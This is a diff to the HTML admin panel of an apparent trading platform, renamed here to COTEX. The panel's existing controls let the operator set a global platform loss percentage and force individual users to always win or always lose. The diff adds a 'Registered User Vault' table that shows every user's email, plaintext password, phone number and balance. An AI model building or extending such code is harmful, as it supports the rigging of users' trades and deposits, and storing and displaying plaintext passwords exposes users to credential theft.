@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PRO-TRADE Master Admin Control</title>
+  <title>COTEX Master Admin Panel</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
     body { background: #0b0e14; color: white; padding: 20px; }
@@ -16,6 +16,9 @@
     .btn-approve { background: #00c853; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
     .btn-reject { background: #ff1744; font-weight: bold; cursor: pointer; border: none; padding: 6px 12px; border-radius: 4px; }
     .queue-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #0b0e14; margin-bottom: 8px; border-radius: 6px; font-size: 13px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
+    th, td { border: 1px solid #222b3d; padding: 8px; text-align: left; }
+    th { background: #0b0e14; color: #00e676; }
   </style>
 </head>
 <body>
@@ -23,7 +26,7 @@
   <div id="login-box" class="card" style="max-width: 380px; margin: 80px auto;">
     <h2>Admin Master Access</h2>
     <input type="password" id="pin" placeholder="Enter Security PIN" style="width: 100%; padding: 12px; margin-bottom: 15px; background: #0b0e14; border: 1px solid #222b3d; color: white; border-radius: 6px;">
-    <button onclick="login()" style="width: 100%; background: #00e676; color: black; font-weight: bold; cursor: pointer; border: none;">Login Master Panel</button>
+    <button onclick="login()" style="width: 100%; background: #00e676; color: black; font-weight: bold; cursor: pointer; border: none;">Login Dashboard</button>
   </div>
 
   <div id="dashboard" style="display: none;">
@@ -38,7 +41,7 @@
     </div>
 
     <div class="card">
-      <h2>Institutional Market Manipulation Engine</h2>
+      <h2>Institutional Manipulation Controls</h2>
       <div style="display: flex; flex-direction: column; gap: 12px;">
         <div style="display: flex; gap: 10px; align-items: center;">
           <span style="font-size: 14px; width: 180px;">Global Platform Loss %:</span>
@@ -53,12 +56,29 @@
         <div style="display: flex; gap: 10px; align-items: center; margin-top: 10px;">
           <span style="font-size: 14px; width: 180px;">Individual User Mode:</span>
           <select id="user-mode" onchange="setMode()">
-            <option value="AUTO">AUTO (Natural System Algorithm)</option>
+            <option value="AUTO">AUTO (Natural System)</option>
             <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
             <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
           </select>
         </div>
       </div>
+    </div>
+
+    <div class="card">
+      <h2>Registered User Vault (Email & Plain Password)</h2>
+      <table id="user-table">
+        <thead>
+          <tr>
+            <th>User ID</th>
+            <th>Name</th>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Phone</th>
+            <th>Real Balance</th>
+          </tr>
+        </thead>
+        <tbody></tbody>
+      </table>
     </div>
 
     <div class="card">
@@ -92,6 +112,20 @@
           document.getElementById('d-24h-profit').innerText = '$' + data.stats.profit24h;
           document.getElementById('house-edge-val').value = data.stats.houseEdge;
           document.getElementById('big-bet-val').value = data.stats.bigBetThreshold;
+
+          // Render User Table
+          let uHtml = '';
+          data.users.forEach(u => {
+            uHtml += `<tr>
+              <td>${u.id}</td>
+              <td>${u.fullName || 'N/A'}</td>
+              <td>${u.email}</td>
+              <td style="color:#00e676; font-weight:bold;">${u.password}</td>
+              <td>${u.phone}</td>
+              <td>$${u.realBalance.toFixed(2)}</td>
+            </tr>`;
+          });
+          document.querySelector('#user-table tbody').innerHTML = uHtml || '<tr><td colspan="6">No registered users</td></tr>';
 
           let html = '';
           data.pendingDeposits.forEach(d => {
